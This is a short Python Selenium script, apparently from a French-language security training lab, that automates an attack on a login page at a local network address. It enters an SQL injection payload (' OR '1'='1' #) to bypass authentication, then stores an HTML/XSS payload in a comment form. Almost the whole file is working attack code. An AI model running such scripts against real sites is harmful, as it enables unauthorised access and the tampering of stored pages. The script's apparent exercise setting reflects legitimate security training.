import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

LOGIN_URL = "http://192.168.0.140/flopsecurity/index.php"
SQLI_PAYLOAD = '" OR "1"="1" #'
XSS_PAYLOAD = '<h2>Cette page est vulnérable !</h2>'

driver = webdriver.Chrome()

try:
    driver.get(LOGIN_URL)

    email_field = driver.find_element(By.NAME, "email")
    password_field = driver.find_element(By.NAME, "password")
    login_button = driver.find_element(By.XPATH, "//button[@type='submit']")

    email_field.send_keys(SQLI_PAYLOAD)
    password_field.send_keys("n'importe quoi")
    login_button.click()

    etape2_link = WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.LINK_TEXT, "Etape 2"))
    )
    etape2_link.click()

    WebDriverWait(driver, 10).until(EC.alert_is_present())
    alert = driver.switch_to.alert
    alert.accept()

    pseudo_field = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.NAME, "pseudo"))
    )
    comment_textarea = driver.find_element(By.NAME, "commentaire")
    save_button = driver.find_element(By.XPATH, "//button[text()='Save']")

    pseudo_field.send_keys("uruz")
    comment_textarea.send_keys(XSS_PAYLOAD)
    save_button.click()
    
    time.sleep(10)

finally:
    driver.quit()